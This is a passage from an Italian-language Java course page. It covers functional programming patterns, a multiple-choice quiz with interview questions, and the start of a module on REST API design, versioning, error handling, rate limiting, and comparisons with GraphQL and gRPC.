// APPROCCIO FUNZIONALE
// ═══════════════════════════════════════════════════════════

Map&lt;String, Double&gt; totals = orders.stream()
    .filter(o -> o.status() == Status.SHIPPED)
    .collect(Collectors.groupingBy(
        Order::customer,
        Collectors.summingDouble(Order::total)
    ));

// Vantaggi FP qui:
// - Una espressione, nessuno stato mutabile
// - Facilmente parallelizzabile: .parallelStream()
// - Più conciso e dichiarativo
// - Nessun bug da stato condiviso</code></pre>

                <h3>Composizione di Funzioni</h3>

                <p>In FP, le funzioni complesse si costruiscono componendo funzioni semplici. Java supporta questo con <code>Function.andThen()</code> e <code>Function.compose()</code>.</p>

                <pre><code class="language-java">// Funzioni base
Function&lt;String, String&gt; trim = String::trim;
Function&lt;String, String&gt; lowercase = String::toLowerCase;
Function&lt;String, String&gt; removeSpaces = s -> s.replace(" ", "_");

// Composizione: crea una pipeline di trasformazioni
Function&lt;String, String&gt; normalize = trim
    .andThen(lowercase)
    .andThen(removeSpaces);

normalize.apply("  Hello World  ");  // "hello_world"

// Predicati composti
Predicate&lt;Order&gt; isShipped = o -> o.status() == Status.SHIPPED;
Predicate&lt;Order&gt; isHighValue = o -> o.total() > 100;

// Combina predicati
Predicate&lt;Order&gt; isImportant = isShipped.and(isHighValue);
Predicate&lt;Order&gt; needsAttention = isShipped.negate().or(isHighValue);

orders.stream()
    .filter(isImportant)
    .forEach(System.out::println);</code></pre>

                <h3>Pattern Funzionali Comuni</h3>

                <pre><code class="language-java">// 1. CURRYING: funzione che ritorna funzione
// Utile per partial application
Function&lt;Double, Function&lt;Double, Double&gt;&gt; multiply =
    a -> b -> a * b;

Function&lt;Double, Double&gt; double_ = multiply.apply(2.0);
Function&lt;Double, Double&gt; triple = multiply.apply(3.0);

double_.apply(5.0);  // 10.0
triple.apply(5.0);   // 15.0

// 2. MEMOIZATION: cache dei risultati (per funzioni pure)
public class Memoizer&lt;T, R&gt; {
    private final Map&lt;T, R&gt; cache = new ConcurrentHashMap&lt;&gt;();

    public Function&lt;T, R&gt; memoize(Function&lt;T, R&gt; fn) {
        return input -> cache.computeIfAbsent(input, fn);
    }
}

// Uso: Fibonacci memoizzato
Function&lt;Integer, Long&gt; fib = new Memoizer&lt;Integer, Long&gt;()
    .memoize(n -> n &lt;= 1 ? n : fib.apply(n-1) + fib.apply(n-2));

// 3. EITHER: gestione errori funzionale (simula con sealed classes)
sealed interface Either&lt;L, R&gt; permits Left, Right {}
record Left&lt;L, R&gt;(L value) implements Either&lt;L, R&gt; {}
record Right&lt;L, R&gt;(R value) implements Either&lt;L, R&gt; {}

public Either&lt;String, User&gt; findUser(String id) {
    User user = repository.find(id);
    return user != null
        ? new Right&lt;&gt;(user)
        : new Left&lt;&gt;("User not found: " + id);
}

// Pattern matching (Java 21+)
String result = switch (findUser("123")) {
    case Right(User user) -> "Found: " + user.name();
    case Left(String error) -> "Error: " + error;
};</code></pre>
            </section>

            <!-- Quiz Section Modulo 8 -->
            <section class="quiz-section" id="modulo8-quiz">
                <h2>Interactive Challenge Quiz - Modulo 8</h2>
                <p>Verifica la tua comprensione della programmazione funzionale.</p>

                <!-- Question 36 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Quale delle seguenti funzioni è PURA?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q36" id="q36a" value="a">
                            <label for="q36a"><code>int count() { return counter++; }</code></label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q36" id="q36b" value="b">
                            <label for="q36b"><code>double random() { return Math.random(); }</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q36" id="q36c" value="c">
                            <label for="q36c"><code>int add(int a, int b) { return a + b; }</code></label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q36" id="q36d" value="d">
                            <label for="q36d"><code>void log(String msg) { System.out.println(msg); }</code></label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q36')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q36"></div>
                </div>

                <!-- Question 37 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Hai uno stream di 1 milione di elementi. Quale operazione NON beneficia di <code>parallelStream()</code>?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q37" id="q37a" value="a">
                            <label for="q37a"><code>filter(isPrime)</code> dove isPrime è CPU-intensive</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q37" id="q37b" value="b">
                            <label for="q37b"><code>forEach(item -> httpClient.post(item))</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q37" id="q37c" value="c">
                            <label for="q37c"><code>map(x -> complexCalculation(x))</code></label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q37" id="q37d" value="d">
                            <label for="q37d"><code>reduce(0, (a,b) -> a + b)</code></label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q37')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q37"></div>
                </div>

                <!-- Question 38 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q3.</span> Quale codice produce un bug silenzioso con Optional?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q38" id="q38a" value="a">
                            <label for="q38a"><code>optional.orElse("default")</code></label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q38" id="q38b" value="b">
                            <label for="q38b"><code>optional.map(String::toUpperCase)</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q38" id="q38c" value="c">
                            <label for="q38c"><code>optional.orElseThrow()</code></label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q38" id="q38d" value="d">
                            <label for="q38d"><code>optional.orElse(expensiveComputation())</code></label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q38')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q38"></div>
                </div>

                <!-- Question 39 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q4.</span> Perché le operazioni intermedie degli Stream sono "lazy"?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q39" id="q39a" value="a">
                            <label for="q39a">Per ottimizzare: eseguono solo quando serve e possono fondere operazioni</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q39" id="q39b" value="b">
                            <label for="q39b">Per motivi di thread-safety: evitano race conditions</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q39" id="q39c" value="c">
                            <label for="q39c">Per compatibilità con versioni precedenti di Java</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q39" id="q39d" value="d">
                            <label for="q39d">Perché Java non può eseguire operazioni senza un return type</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q39')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q39"></div>
                </div>

                <!-- Question 40 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> Qual è il principale vantaggio dell'immutabilità in ambienti multi-thread?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q40" id="q40a" value="a">
                            <label for="q40a">Riduce l'utilizzo di memoria grazie alla condivisione</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q40" id="q40b" value="b">
                            <label for="q40b">Permette al garbage collector di lavorare più efficientemente</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q40" id="q40c" value="c">
                            <label for="q40c">Elimina la necessità di sincronizzazione: nessuna race condition possibile</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q40" id="q40d" value="d">
                            <label for="q40d">Rende il codice più veloce grazie alle ottimizzazioni del compilatore</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q40')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q40"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 8 -->
            <section class="section" id="modulo8-questions">
                <h2>Domande da Colloquio - Modulo 8</h2>

                <div class="info-box">
                    <h4>Q: Cos'è una pure function e perché è importante?</h4>
                    <p><strong>Risposta attesa:</strong> Una pure function ha due proprietà: 1) È deterministica - dato lo stesso input, ritorna sempre lo stesso output. 2) Non ha side effects - non modifica stato esterno, non fa I/O, non muta gli argomenti. Sono importanti perché: sono facili da testare (nessun setup/mock necessario), thread-safe per natura (niente stato condiviso da sincronizzare), facili da ragionare (il comportamento dipende solo dagli argomenti), componibili (puoi combinarle liberamente), memoizzabili (puoi cachare i risultati).</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra <code>map</code> e <code>flatMap</code> negli Stream Java.</h4>
                    <p><strong>Risposta attesa:</strong> <code>map</code> trasforma ogni elemento in un altro elemento (1:1). <code>flatMap</code> trasforma ogni elemento in uno Stream e poi "appiattisce" tutti gli Stream risultanti in uno solo. Esempio: se hai <code>List&lt;Order&gt;</code> e ogni Order ha <code>List&lt;Item&gt;</code>, <code>map(Order::getItems)</code> dà <code>Stream&lt;List&lt;Item&gt;&gt;</code> (stream di liste), mentre <code>flatMap(o -> o.getItems().stream())</code> dà <code>Stream&lt;Item&gt;</code> (stream di item, appiattito). flatMap è essenziale per gestire strutture nested.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quando useresti <code>orElse</code> vs <code>orElseGet</code> con Optional?</h4>
                    <p><strong>Risposta attesa:</strong> <code>orElse(value)</code> valuta sempre l'argomento, anche se Optional contiene un valore. <code>orElseGet(supplier)</code> è lazy: chiama il supplier solo se Optional è vuoto. Usa <code>orElseGet</code> quando il valore di default è costoso da calcolare (query DB, chiamata API, calcolo pesante). Esempio: <code>optional.orElse(repository.findDefault())</code> esegue SEMPRE la query, mentre <code>optional.orElseGet(() -> repository.findDefault())</code> la esegue solo se necessario.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come gestisci gli errori in modo funzionale in Java?</h4>
                    <p><strong>Risposta attesa:</strong> Diversi approcci: 1) <code>Optional</code> per rappresentare assenza di valore (ma non porta info sull'errore). 2) Creare un tipo <code>Either&lt;Error, Success&gt;</code> o <code>Result</code> con sealed classes (Java 17+) per rappresentare successo O fallimento con dettagli. 3) <code>CompletableFuture</code> per operazioni async con <code>exceptionally()</code> o <code>handle()</code>. 4) Librerie come Vavr che forniscono <code>Try</code> e <code>Either</code>. L'idea è evitare eccezioni checked per control flow e rendere gli errori parte esplicita del tipo di ritorno.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quali sono i rischi di usare parallel streams?</h4>
                    <p><strong>Risposta attesa:</strong> 1) Overhead: per dataset piccoli o operazioni semplici, il costo di parallelizzazione supera i benefici. 2) ForkJoinPool condiviso: tutti i parallel streams usano lo stesso pool, operazioni bloccanti (I/O) possono starved altri stream. 3) Ordine: operazioni come <code>forEachOrdered</code> annullano i benefici. 4) Thread-safety: le operazioni devono essere stateless, side-effects causano race conditions. 5) Fonte non splittabile: LinkedList si divide male, ArrayList bene. Rule of thumb: usa parallel solo con CPU-bound operations su dataset grandi (>10K elementi) da sorgenti splittabili.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come combini OOP e FP in un progetto Java moderno?</h4>
                    <p><strong>Risposta attesa:</strong> L'approccio ibrido: 1) Domain model con OOP - entità come User, Order con identità e comportamento incapsulato. 2) Service layer con FP - logica di business come trasformazioni di dati usando Streams. 3) DTOs/Records immutabili - per trasferimento dati tra layer. 4) Optional per null-safety nei return types. 5) Collectors per aggregazioni complesse. 6) Funzioni pure per logica testabile isolata. Esempio: Spring Service con bean mutabile ma metodi che usano Streams per processare dati, ritornando Record immutabili.</p>
                </div>
            </section>

            <!-- ==================== MODULO 9: API DESIGN ==================== -->

            <header class="module-header" id="modulo9">
                <span class="module-tag">Modulo 9</span>
                <h1>API Design</h1>
                <p>REST best practices, versioning, error handling e confronto con GraphQL e gRPC</p>
            </header>

            <!-- REST Best Practices Section -->
            <section class="section" id="modulo9-rest">
                <h2>REST API Best Practices</h2>

                <p><strong>REST</strong> (Representational State Transfer) è lo stile architetturale più diffuso per le API web. Ma "fare REST" non significa solo usare HTTP: richiede seguire principi precisi per creare API intuitive, consistenti e manutenibili.</p>

                <h3>Resource Naming Conventions</h3>

                <p>In REST, le URL rappresentano <strong>risorse</strong> (sostantivi), non azioni (verbi). Le azioni sono espresse tramite HTTP methods.</p>

                <table>
                    <thead>
                        <tr>
                            <th>❌ Sbagliato</th>
                            <th>✅ Corretto</th>
                            <th>Perché</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>/getUsers</code></td>
                            <td><code>GET /users</code></td>
                            <td>Il verbo è nell'HTTP method, non nell'URL</td>
                        </tr>
                        <tr>
                            <td><code>/createUser</code></td>
                            <td><code>POST /users</code></td>
                            <td>POST implica creazione</td>
                        </tr>
                        <tr>
                            <td><code>/user/123</code></td>
                            <td><code>/users/123</code></td>
                            <td>Collezioni al plurale, consistenza</td>
                        </tr>
                        <tr>
                            <td><code>/users/123/getOrders</code></td>
                            <td><code>GET /users/123/orders</code></td>
                            <td>Risorse nested, niente verbi</td>
                        </tr>
                    </tbody>
                </table>

                <pre><code class="language-yaml"># Struttura URL consistente
GET    /users                    # Lista utenti
POST   /users                    # Crea utente
GET    /users/{id}               # Dettaglio utente
PUT    /users/{id}               # Replace completo utente
PATCH  /users/{id}               # Update parziale utente
DELETE /users/{id}               # Elimina utente

# Risorse nested (relazioni)
GET    /users/{id}/orders        # Ordini di un utente
POST   /users/{id}/orders        # Crea ordine per utente
GET    /users/{id}/orders/{oid}  # Dettaglio ordine specifico

# Azioni non-CRUD (quando necessario, usa verbi espliciti)
POST   /users/{id}/activate      # Azione specifica
POST   /orders/{id}/cancel       # Azione specifica</code></pre>

                <h3>HTTP Methods e Semantica</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Method</th>
                            <th>Semantica</th>
                            <th>Idempotent</th>
                            <th>Safe</th>
                            <th>Request Body</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>GET</code></td>
                            <td>Leggi risorsa</td>
                            <td>✅ Sì</td>
                            <td>✅ Sì</td>
                            <td>No</td>
                        </tr>
                        <tr>
                            <td><code>POST</code></td>
                            <td>Crea risorsa</td>
                            <td>❌ No</td>
                            <td>❌ No</td>
                            <td>Sì</td>
                        </tr>
                        <tr>
                            <td><code>PUT</code></td>
                            <td>Replace completo</td>
                            <td>✅ Sì</td>
                            <td>❌ No</td>
                            <td>Sì</td>
                        </tr>
                        <tr>
                            <td><code>PATCH</code></td>
                            <td>Update parziale</td>
                            <td>❌ No*</td>
                            <td>❌ No</td>
                            <td>Sì</td>
                        </tr>
                        <tr>
                            <td><code>DELETE</code></td>
                            <td>Elimina risorsa</td>
                            <td>✅ Sì</td>
                            <td>❌ No</td>
                            <td>No (raro)</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>Idempotency: Perché è Cruciale?</h4>
                    <p>Un'operazione è <strong>idempotente</strong> se eseguirla più volte produce lo stesso risultato. È fondamentale per retry automatici e fault tolerance. GET, PUT, DELETE sono idempotenti: se la rete fallisce e il client riprova, non causa danni. POST non è idempotente: due POST creano due risorse. Per rendere POST idempotente, usa un <strong>idempotency key</strong> nell'header.</p>
                </div>

                <pre><code class="language-java">// Idempotency Key per POST - previene duplicati su retry
// Client invia: X-Idempotency-Key: abc123-unique-id

@PostMapping("/payments")
public ResponseEntity&lt;Payment&gt; createPayment(
        @RequestHeader("X-Idempotency-Key") String idempotencyKey,
        @RequestBody PaymentRequest request) {

    // Controlla se già processato
    Optional&lt;Payment&gt; existing = paymentRepository.findByIdempotencyKey(idempotencyKey);
    if (existing.isPresent()) {
        return ResponseEntity.ok(existing.get());  // Ritorna risultato cached
    }

    // Processa nuovo pagamento
    Payment payment = paymentService.process(request);
    payment.setIdempotencyKey(idempotencyKey);
    paymentRepository.save(payment);

    return ResponseEntity.status(HttpStatus.CREATED).body(payment);
}</code></pre>

                <h3>HTTP Status Codes</h3>

                <p>Usa i codici di stato corretti - il client deve poter capire l'esito dalla risposta HTTP senza parsare il body.</p>

                <table>
                    <thead>
                        <tr>
                            <th>Code</th>
                            <th>Significato</th>
                            <th>Quando Usarlo</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>200 OK</strong></td>
                            <td>Successo generico</td>
                            <td>GET, PUT, PATCH, DELETE con body</td>
                        </tr>
                        <tr>
                            <td><strong>201 Created</strong></td>
                            <td>Risorsa creata</td>
                            <td>POST che crea, include Location header</td>
                        </tr>
                        <tr>
                            <td><strong>204 No Content</strong></td>
                            <td>Successo, nessun body</td>
                            <td>DELETE, PUT/PATCH senza response body</td>
                        </tr>
                        <tr>
                            <td><strong>400 Bad Request</strong></td>
                            <td>Request malformata</td>
                            <td>JSON invalido, validazione fallita</td>
                        </tr>
                        <tr>
                            <td><strong>401 Unauthorized</strong></td>
                            <td>Non autenticato</td>
                            <td>Token mancante o invalido</td>
                        </tr>
                        <tr>
                            <td><strong>403 Forbidden</strong></td>
                            <td>Non autorizzato</td>
                            <td>Autenticato ma senza permessi</td>
                        </tr>
                        <tr>
                            <td><strong>404 Not Found</strong></td>
                            <td>Risorsa non esiste</td>
                            <td>GET/PUT/DELETE su ID inesistente</td>
                        </tr>
                        <tr>
                            <td><strong>409 Conflict</strong></td>
                            <td>Conflitto di stato</td>
                            <td>Violazione unique constraint, optimistic lock</td>
                        </tr>
                        <tr>
                            <td><strong>422 Unprocessable</strong></td>
                            <td>Semanticamente errato</td>
                            <td>JSON valido ma dati non processabili</td>
                        </tr>
                        <tr>
                            <td><strong>429 Too Many Requests</strong></td>
                            <td>Rate limit superato</td>
                            <td>Include Retry-After header</td>
                        </tr>
                        <tr>
                            <td><strong>500 Internal Error</strong></td>
                            <td>Errore server</td>
                            <td>Bug non gestito (evitare!)</td>
                        </tr>
                        <tr>
                            <td><strong>503 Service Unavailable</strong></td>
                            <td>Temporaneamente down</td>
                            <td>Manutenzione, overload</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Pagination</h3>

                <p>Per collezioni grandi, la pagination è obbligatoria. Due approcci principali:</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        PAGINATION STRATEGIES                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  OFFSET-BASED (tradizionale)                                                │
│  ────────────────────────────                                                │
│  GET /users?page=3&size=20                                                  │
│                                                                              │
│  Pro: ✓ Semplice, ✓ Salta a pagina specifica                                │
│  Contro: ✗ Inconsistenze se dati cambiano, ✗ Lento su offset grandi        │
│          (DB deve scorrere N righe per OFFSET N)                            │
│                                                                              │
│  ─────────────────────────────────────────────────────────────────────────  │
│                                                                              │
│  CURSOR-BASED (consigliato per feed/timeline)                               │
│  ──────────────────────────────────────────────                              │
│  GET /users?cursor=eyJpZCI6MTIzfQ&limit=20                                  │
│                                                                              │
│  Pro: ✓ Consistente, ✓ Performante (usa indice)                             │
│  Contro: ✗ No "vai a pagina X", ✗ Solo avanti/indietro                      │
│                                                                              │
│  Il cursor è tipicamente un ID encoded (base64) o un timestamp              │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// Offset-based pagination response
{
  "data": [...],
  "pagination": {
    "page": 3,
    "size": 20,
    "totalElements": 1250,
    "totalPages": 63
  }
}

// Cursor-based pagination response
{
  "data": [...],
  "pagination": {
    "nextCursor": "eyJpZCI6MTQzLCJjcmVhdGVkQXQiOiIyMDI2LTAxLTI4In0=",
    "prevCursor": "eyJpZCI6MTIzLCJjcmVhdGVkQXQiOiIyMDI2LTAxLTI3In0=",
    "hasMore": true
  }
}</code></pre>

                <h3>Filtering, Sorting, Searching</h3>

                <pre><code class="language-yaml"># Filtering - query params per campo
GET /products?category=electronics&minPrice=100&maxPrice=500&inStock=true

# Sorting - campo e direzione
GET /products?sort=price:asc
GET /products?sort=createdAt:desc,name:asc    # Multi-sort

# Searching - full-text search
GET /products?q=wireless+headphones

# Field selection (sparse fieldsets) - riduce payload
GET /users/123?fields=id,name,email

# Combinazione
GET /products?category=electronics&q=sony&sort=price:asc&page=1&size=20</code></pre>

                <h3>HATEOAS (Hypermedia)</h3>

                <p><strong>HATEOAS</strong> (Hypermedia As The Engine Of Application State) è il livello più alto di REST maturity. Le response includono link alle azioni disponibili, rendendo l'API auto-documentante e navigabile.</p>

                <pre><code class="language-json">{
  "id": 123,
  "status": "PENDING",
  "total": 99.99,
  "customer": {
    "id": 456,
    "name": "Alice"
  },
  "_links": {
    "self": { "href": "/orders/123" },
    "customer": { "href": "/users/456" },
    "items": { "href": "/orders/123/items" },
    "cancel": { "href": "/orders/123/cancel", "method": "POST" },
    "pay": { "href": "/orders/123/pay", "method": "POST" }
  }
}</code></pre>

                <div class="info-box">
                    <h4>HATEOAS: Usarlo o No?</h4>
                    <p>In pratica, HATEOAS completo è raramente implementato. Il valore principale è per API pubbliche dove i client non dovrebbero hardcodare URL. Per API interne o con client controllati, spesso l'overhead non vale il beneficio. Un compromesso comune è includere solo i link essenziali (self, next/prev per pagination).</p>
                </div>
            </section>

            <!-- Versioning & Error Handling Section -->
            <section class="section" id="modulo9-versioning">
                <h2>Versioning, Error Handling e Rate Limiting</h2>

                <h3>API Versioning Strategies</h3>

                <p>Le API evolvono. Il versioning permette di introdurre breaking changes senza rompere i client esistenti.</p>

                <table>
                    <thead>
                        <tr>
                            <th>Strategia</th>
                            <th>Esempio</th>
                            <th>Pro</th>
                            <th>Contro</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>URL Path</strong></td>
                            <td><code>/api/v1/users</code></td>
                            <td>Visibile, facile da capire, cacheable</td>
                            <td>URL "brutti", viola REST purity</td>
                        </tr>
                        <tr>
                            <td><strong>Query Param</strong></td>
                            <td><code>/users?version=1</code></td>
                            <td>Semplice, flessibile</td>
                            <td>Facile da dimenticare, caching complesso</td>
                        </tr>
                        <tr>
                            <td><strong>Header</strong></td>
                            <td><code>Accept: application/vnd.api+json;v=1</code></td>
                            <td>URL pulite, REST-compliant</td>
                            <td>Meno visibile, difficile da testare</td>
                        </tr>
                        <tr>
                            <td><strong>Content Negotiation</strong></td>
                            <td><code>Accept: application/vnd.company.v1+json</code></td>
                            <td>Semanticamente corretto</td>
                            <td>Complesso, poco usato</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box success">
                    <h4>Raccomandazione Pratica</h4>
                    <p><strong>URL Path versioning</strong> (<code>/api/v1/</code>) è il più diffuso e pragmatico. È visibile, facile da documentare, e i client sanno subito quale versione usano. Usa major version only (v1, v2) - non v1.2.3. Mantieni la versione precedente per un periodo di deprecation (6-12 mesi) prima di rimuoverla.</p>
                </div>

                <h3>Error Handling Standardizzato</h3>

                <p>Un formato errori consistente è fondamentale per developer experience. RFC 7807 (Problem Details for HTTP APIs) è lo standard emergente.</p>

                <pre><code class="language-json">// RFC 7807 Problem Details format
{
  "type": "https://api.example.com/errors/validation-error",
  "title": "Validation Error",
  "status": 400,
  "detail": "The request contains invalid fields",
  "instance": "/users/registration",
  "timestamp": "2026-01-28T10:30:00Z",
  "traceId": "abc123-def456",
  "errors": [
    {
      "field": "email",
      "code": "INVALID_FORMAT",
      "message": "Must be a valid email address"
    },
    {
      "field": "password",
      "code": "TOO_SHORT",
      "message": "Must be at least 8 characters"
    }
  ]
}</code></pre>

                <pre><code class="language-java">// Spring Boot: Global Exception Handler
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity&lt;ProblemDetail&gt; handleValidation(
            MethodArgumentNotValidException ex,
            HttpServletRequest request) {

        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.BAD_REQUEST);
        problem.setType(URI.create("https://api.example.com/errors/validation"));
        problem.setTitle("Validation Error");
        problem.setDetail("The request contains invalid fields");
        problem.setInstance(URI.create(request.getRequestURI()));

        List&lt;FieldError&gt; fieldErrors = ex.getBindingResult().getFieldErrors()
            .stream()
            .map(e -> new FieldError(e.getField(), e.getCode(), e.getDefaultMessage()))
            .toList();

        problem.setProperty("errors", fieldErrors);
        problem.setProperty("traceId", MDC.get("traceId"));

        return ResponseEntity.badRequest().body(problem);
    }

    @ExceptionHandler(ResourceNotFoundException.class)
    public ResponseEntity&lt;ProblemDetail&gt; handleNotFound(ResourceNotFoundException ex) {
        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.NOT_FOUND);
        problem.setTitle("Resource Not Found");
        problem.setDetail(ex.getMessage());
        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(problem);
    }

    @ExceptionHandler(Exception.class)
    public ResponseEntity&lt;ProblemDetail&gt; handleGeneric(Exception ex) {
        log.error("Unhandled exception", ex);

        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.INTERNAL_SERVER_ERROR);
        problem.setTitle("Internal Server Error");
        problem.setDetail("An unexpected error occurred");  // Non esporre dettagli interni!

        return ResponseEntity.internalServerError().body(problem);
    }
}</code></pre>

                <h3>Rate Limiting</h3>

                <p>Il <strong>rate limiting</strong> protegge l'API da abusi e garantisce fair usage. Comunica sempre i limiti al client tramite headers.</p>

                <pre><code class="language-yaml"># Response headers per rate limiting
X-RateLimit-Limit: 1000           # Richieste permesse per window
X-RateLimit-Remaining: 847        # Richieste rimanenti
X-RateLimit-Reset: 1706439600     # Unix timestamp reset window

# Quando limite superato: 429 Too Many Requests
HTTP/1.1 429 Too Many Requests
Retry-After: 60                   # Secondi da aspettare
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 0

{
  "type": "https://api.example.com/errors/rate-limit",
  "title": "Rate Limit Exceeded",
  "status": 429,
  "detail": "You have exceeded the rate limit of 1000 requests per hour"
}</code></pre>

                <div class="info-box">
                    <h4>Strategie di Rate Limiting</h4>
                    <ul>
                        <li><strong>Fixed Window</strong>: N richieste per minuto/ora. Semplice, ma burst al confine dei window.</li>
                        <li><strong>Sliding Window</strong>: Conta richieste negli ultimi N secondi. Più smooth, più complesso.</li>
                        <li><strong>Token Bucket</strong>: Token aggiunti costantemente, consumati per richiesta. Permette burst controllati.</li>
                        <li><strong>Per-endpoint</strong>: Limiti diversi per endpoint (es. login più restrittivo).</li>
                    </ul>
                </div>
            </section>

            <!-- REST vs GraphQL vs gRPC Section -->
            <section class="section" id="modulo9-comparison">
                <h2>REST vs GraphQL vs gRPC</h2>

                <p>REST non è l'unica opzione. GraphQL e gRPC risolvono problemi specifici dove REST mostra limiti.</p>

                <h3>Confronto ad Alto Livello</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>REST</th>
                            <th>GraphQL</th>
                            <th>gRPC</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Paradigma</strong></td>
                            <td>Resource-based</td>
                            <td>Query language</td>
                            <td>RPC (Remote Procedure Call)</td>
                        </tr>
                        <tr>
                            <td><strong>Protocollo</strong></td>
                            <td>HTTP/1.1, HTTP/2</td>
                            <td>HTTP (tipicamente POST)</td>
                            <td>HTTP/2</td>
                        </tr>
                        <tr>
                            <td><strong>Formato dati</strong></td>
                            <td>JSON (tipicamente)</td>
                            <td>JSON</td>
                            <td>Protocol Buffers (binario)</td>
                        </tr>
                        <tr>
                            <td><strong>Schema/Contract</strong></td>
                            <td>OpenAPI (opzionale)</td>
                            <td>Schema GraphQL (obbligatorio)</td>
                            <td>.proto files (obbligatorio)</td>
                        </tr>
                        <tr>
                            <td><strong>Over/Under-fetching</strong></td>
                            <td>Comune problema</td>
                            <td>Risolto (client sceglie campi)</td>
                            <td>Definito nel proto</td>
                        </tr>
                        <tr>
                            <td><strong>Caching</strong></td>
                            <td>HTTP caching nativo</td>
                            <td>Complesso (tutto è POST)</td>
                            <td>Manuale</td>
                        </tr>
                        <tr>
                            <td><strong>Performance</strong></td>
                            <td>Buona</td>
                            <td>Variabile (query N+1)</td>
                            <td>Eccellente (binario, HTTP/2)</td>
                        </tr>
                        <tr>
                            <td><strong>Learning curve</strong></td>
                            <td>Bassa</td>
                            <td>Media</td>
                            <td>Alta</td>
                        </tr>
                    </tbody>
                </table>

                <h3>GraphQL: Quando Usarlo</h3>

                <pre><code class="language-graphql"># Il client richiede esattamente i campi che serve
query {
  user(id: "123") {
    name
    email
    orders(last: 5) {
      id
      total
      items {
        productName
        quantity
      }
    }
  }
}

# Una singola richiesta invece di:
# GET /users/123
# GET /users/123/orders?limit=5
# GET /orders/1/items
# GET /orders/2/items
# ...</code></pre>

                <div class="info-box success">
                    <h4>GraphQL: Pro e Contro</h4>
                    <p><strong>Pro</strong>: Niente over/under-fetching, single endpoint, strongly typed, ottimo per UI complesse con dati nested, introspection built-in.</p>
                    <p><strong>Contro</strong>: Caching HTTP non funziona, rischio query N+1 sul server (richiede DataLoader), complessità schema, difficile rate limiting per query.</p>
                    <p><strong>Usa quando</strong>: Frontend complessi (mobile app, SPA), dati altamente relazionali, client diversi con bisogni diversi, team frontend/backend separati.</p>
                </div>

                <h3>gRPC: Quando Usarlo</h3>

                <pre><code class="language-yaml"># user.proto - definizione del servizio
syntax = "proto3";

package user;

service UserService {
  rpc GetUser(GetUserRequest) returns (User);
  rpc ListUsers(ListUsersRequest) returns (stream User);  // Streaming!
  rpc CreateUser(CreateUserRequest) returns (User);
}

message User {
  string id = 1;
  string name = 2;
  string email = 3;
  repeated Order orders = 4;
}

message GetUserRequest {
  string id = 1;
}

message Order {
  string id = 1;
  double total = 2;
